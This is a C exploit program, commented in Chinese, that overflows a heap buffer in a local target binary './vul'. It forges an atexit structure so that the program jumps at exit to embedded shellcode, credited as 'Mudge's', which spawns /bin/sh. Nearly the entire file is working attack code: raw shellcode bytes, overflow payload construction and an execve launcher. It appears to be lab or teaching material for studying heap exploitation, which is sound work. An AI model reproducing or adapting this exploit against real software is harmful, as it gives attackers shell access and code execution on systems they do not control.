#include <stdio.h> 
#define PROG "./vul" 
#define HEAP_LEN 128 

int main(int argc, char **argv) 
{
	char **env; 
	char **arg;
	char heap_buf[150]; 
	char eggshell[]= /* Mudge's */ 
                        "\xeb\x35\x5e\x59\x33\xc0\x89\x46\xf5\x83\xc8\x07\x66\x89\x46\xf9" 
                        "\x8d\x1e\x89\x5e\x0b\x33\xd2\x52\x89\x56\x07\x89\x56\x0f\x8d\x46" 
                        "\x0b\x50\x8d\x06\x50\xb8\x7b\x56\x34\x12\x35\x40\x56\x34\x12\x51" 
                        "\x9a\xe8\xc6\xff\xff\xff/bin/sh";      
/*我们将地址指向argv[]，我们需要ind值为负值*/
	memset(heap_buf, 'A', HEAP_LEN); 
	*((int *) (heap_buf + HEAP_LEN)) = (int) argv - (2 * sizeof(int)); 
/*为了构造atexit结构*/ 
	*((int *) (heap_buf + HEAP_LEN + 4)) = (int) 0xffffffff; 
	*((int *) (heap_buf + HEAP_LEN + 8)) = (int) 0; 
/*我们构建自己的atexit结构用于退出时调用*/ 
	env = (char **) malloc(sizeof(char *)); 
	env[0] = 0; 
	arg = (char **) malloc(sizeof(char *) * 4); 
	arg[0] = (char *) malloc(strlen(PROG) + 1); 
	arg[1] = (char *) malloc(strlen(heap_buf) + 1); 
	arg[2] = (char *) malloc(strlen(eggshell) + 1); 
	arg[3] = 0; 
	strcpy(arg[0], PROG); 
	strcpy(arg[1], heap_buf); 
	strcpy(arg[2], eggshell); 
	if (argc > 1) { 
		fprintf(stderr, "Using argv %x\n", argv); 
		execve("./vul", arg, env); 
	}
	else { 
		execve(argv[0], arg, env); 
	} 
}